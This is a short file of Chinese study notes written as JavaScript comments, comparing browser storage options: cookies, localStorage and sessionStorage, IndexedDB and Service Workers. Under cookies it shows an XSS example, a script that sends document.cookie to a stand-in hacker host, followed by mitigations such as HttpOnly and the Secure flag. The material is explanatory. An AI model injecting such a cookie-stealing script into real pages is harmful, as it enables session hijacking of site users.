// 在游览器里，如何缓存数据

// - cookie 4kb 每次都会带上 影响http性能
    // XSS 跨站脚本攻击 
    // <script>
    //     fetch('htpp://www.heike.com?cookie='+document.cookie)
    // </script>
    // http only

    // - 更安全？
    //     https
    //     secure 安全 非HTTPS链接发送cookie
    //     签名
// - localstorage(需要手动删除)/sessionStorage(关掉游览器就消失) 5mb  
// - indexedDB 前段数据库  更大 支持复杂操作 事物
// - ServiceWorker 离线存储 不联网也能打开
